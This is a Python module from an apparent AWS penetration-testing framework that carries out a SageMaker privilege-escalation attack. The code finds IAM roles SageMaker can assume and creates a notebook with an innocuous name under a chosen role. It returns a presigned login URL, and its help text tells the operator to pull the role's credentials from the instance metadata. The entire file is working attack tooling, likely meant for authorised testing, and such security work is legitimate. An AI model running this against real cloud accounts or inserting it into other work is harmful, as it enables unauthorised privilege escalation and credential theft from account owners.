MODULE_METADATA = {
    'name': 'sagemaker_create_notebook',
    'display_name': 'Sagemaker Create Notebook',
    'category': 'privilege_escalation',
    'description': 'Create SageMaker notebook using assumable role and produce signed URL.',
    'requires_region': False,
    'inputs': [
        { 'name': 'continue_without_permission_evidence', 'type': 'boolean', 'required': False, 'description': 'Continue when permission file is missing (y/n).' },
        { 'name': 'role_selection', 'type': 'string', 'required': True, 'description': 'Role option index.' },
        { 'name': 'region', 'type': 'region', 'required': True, 'description': 'SageMaker region.' },
    ],
    'output_type': 'json',
    'risk_level': 'critical'
}
import botocore
from functions.no_color import Fore, Style
from modules.enumeration import iam_enumerate_assume_role
from functions import create_client, utils

def help():
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Module Description:\n")
    print("\tThis module will attemp to create a new Jupyter Notebook with a role")
    print("\tthat can be impersonated by SageMaker. If successfull, it will")
    print("\tcreate a signed link to be used to login to this notebook.\n")

    print("[+] Module Functionality:\n")
    print("\tThe module will try to check if the user has permissions to create a")
    print("\tnotebook and a signed url. It will alert the user in case it don't find")
    print("\tthose permissions.\n")
    print("\tThen, it will enumerate a set of roles that can be used on the attack")
    print("\tand try to create a notebook and a signed url passing this role to it.\n")
    print("\tIf all goes well, you can log into the notebook and request credentials")
    print("\tfrom the EC2 metadata on the notebook's terminal.\n")

    print("[+] IMPORTANT:\n")
    print("\tSometimes your user/role can have the 'sagemaker':'*' permission, or the")
    print("\tclassic '*':'*' permission. This will cause the module to not find the")
    print("\trequired permissions to run. If that is the case, you can simply instruct")
    print("\tto run anyway when prompet and all should be fine.")
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)

def check_permissions(selected_session=None):
    if not selected_session:
        return False

    try:
        permission_results_file = "./results/{}_session_data/iam/iam_enumerate_permissions_results.json".format(selected_session)
        results_file = open(permission_results_file, "r").read()
    except OSError:
        print(Fore.RED + "[-] No permission results found...make sure to run the 'iam_enumerate_permissions' module to enumerate permissions..." + Style.RESET_ALL)
        return False

    if "sagemaker:CreateNotebookInstance" in results_file and "sagemaker:CreatePresignedNotebookInstanceUrl" in results_file and "iam:PassRole" in results_file:
        return True
    else:
        return False 

def check_assumable_roles(botoconfig, session):
    service = 'iam'
    client = create_client.Client(botoconfig, session, service)
    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(client.create_aws_client())

    sage_maker_assumable_roles = []
    
    for role in assumable_roles:
        try:
            if role['AssumeRolePolicyDocument']:
                for principal in role['AssumeRolePolicyDocument']['Statement']:
                    if principal['Principal']['Service'] == 'sagemaker.amazonaws.com':
                        sage_maker_assumable_roles.append(role['Arn'])
        except (KeyError, TypeError):
            continue
    
    return sage_maker_assumable_roles

def parse_assumable_role_option(role_list):
    if role_list:
        print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
        print("[+] Select Role:")
        option = 0
        role_options = {}
        for role in role_list:
            role = role.split("_")[0]
            role_options[str(option)] = role 
            print("{} - {}".format(str(option), role))
            option += 1
        selected_option = input("\nOption: ")
        if not selected_option or selected_option not in role_options:
            print("\n[-] No valid role selected...exiting...")
            return False
        selected_option = int(selected_option)
        role_name = role_options[str(selected_option)]

        return role_name

    else:
        print(Fore.RED + "[-] No roles to impersonate found..." + Style.RESET_ALL)

def create_notebook(botoconfig, session, attack_role, region):
    service = 'sagemaker'
    try:
        client = session.client(service, config=botoconfig, region_name=region)
        notebook_arn = client.create_notebook_instance(
            NotebookInstanceName='MLConfig',
            InstanceType='ml.t2.medium',
            RoleArn=attack_role
        )
        return notebook_arn, client, region

    except botocore.exceptions.ClientError as e:
        print("[-] It was "+Fore.RED+"not possible "+Style.RESET_ALL+"to create a notebook...please check if you have the apropriate permissions")
        print(e)
        return False


def collect_inputs(required_permissions, assumable_roles):
    if not required_permissions:
        option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
        if not option or option.lower() == "n":
            return None

    attack_role = parse_assumable_role_option(assumable_roles)
    if not attack_role:
        return None

    region = input("Please specify a region to create the notebook: ")
    return attack_role, region

def check_notebook_status(sagemaker_client):
    status = sagemaker_client.list_notebook_instances(
        SortBy='Name',
        NameContains='MLConfig',
        StatusEquals='InService'
    )

    if status['NotebookInstances'] == []:
        return False
    else:
        return True

def create_presigned_url(sagemaker_client):
    try:
        signed_url = sagemaker_client.create_presigned_notebook_instance_url(
            NotebookInstanceName='MLConfig'
        )

        return signed_url

    except botocore.exceptions.ClientError as e:
        print(e)

        return False

def main(botoconfig, session, selected_session=None):
    results = {}
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Starting SageMaker privilege escalation module...")
    print("[+] Checking for required permissions...")

    required_permissions = check_permissions(selected_session)

    print("[+] Checking for roles that can be assumed by SageMaker...")
    assumable_roles = check_assumable_roles(botoconfig, session)
    selected_inputs = collect_inputs(required_permissions, assumable_roles)
    if not selected_inputs:
        print("[-] Exiting module...")
        return utils.module_result(status="error", errors=["Missing required input"])

    attack_role, region = selected_inputs

    print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
    notebook_result = create_notebook(botoconfig, session, attack_role, region)
    if not notebook_result:
        return utils.module_result(status="error", errors=["Failed to create notebook"])

    notebook_arn, sagemaker_client, created_region = notebook_result
    if created_region != region:
        region = created_region
    print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
    results["NotebookArn"] = notebook_arn.get("NotebookInstanceArn")

    print("[+] Waiting for notebook to activate...this can take some time...")
    sagemaker_client = session.client('sagemaker', config=botoconfig, region_name=region)
    token = utils.poll_until(lambda: check_notebook_status(sagemaker_client), interval_seconds=10, max_attempts=72)
    if not token:
        return utils.module_result(status="error", errors=["Timed out waiting for notebook to become InService"])

    print("[+] Creating pre-signed url for jupyter notebook...")
    signed_url = create_presigned_url(sagemaker_client)
    if not signed_url:
        return utils.module_result(status="error", errors=["Failed to create pre-signed URL"])
    results["AuthorizedUrl"] = signed_url.get("AuthorizedUrl")
    print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
    return utils.module_result(data=results)




